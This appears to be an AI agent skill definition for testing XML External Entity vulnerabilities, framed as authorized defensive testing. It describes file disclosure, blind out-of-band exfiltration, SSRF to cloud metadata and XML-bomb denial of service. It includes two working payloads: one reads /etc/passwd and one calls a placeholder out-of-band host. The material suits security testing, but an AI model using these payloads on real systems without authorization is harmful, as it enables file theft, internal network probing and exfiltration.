agyos_skill.intent: XML External Entity (XXE) vulnerability testing and mitigation. Identifies file disclosure, blind XXE, and SSRF via XML parsers.
agyos_skill.instructions: > **⚠️ AUTHORIZED USE ONLY**: For authorized defensive security testing and parser hardening. XML External Entity (XXE) injection occurs when an XML parser processes user-supplied XML input containing reference to external entities without disabling external DTD (Document Type Definition) resolution. 1. **Local File Disclosure (LFD)**: Extracting sensitive local system files (`/etc/passwd`, `/etc/hosts`, `win.ini`). 2. **Blind XXE via Out-of-Band Channel**: Exfiltrating file contents via parameter entities when direct XML responses are suppressed. 3. **SSRF via XXE**: Forcing the XML parser to query internal microservices or cloud metadata. 4. **Denial of Service (Billion Laughs / XML Bomb)**: Recursive entity expansion causing CPU/RAM exhaustion. ```xml <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <user> <username>&xxe;</username> <email>test@example.com</email> </user> ``` ```xml <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE test [ <!ENTITY % oob SYSTEM "http://xxe-probe.YOUR_OOB_HOST/callback"> %oob; ]> <order> <id>1001</id> </order>
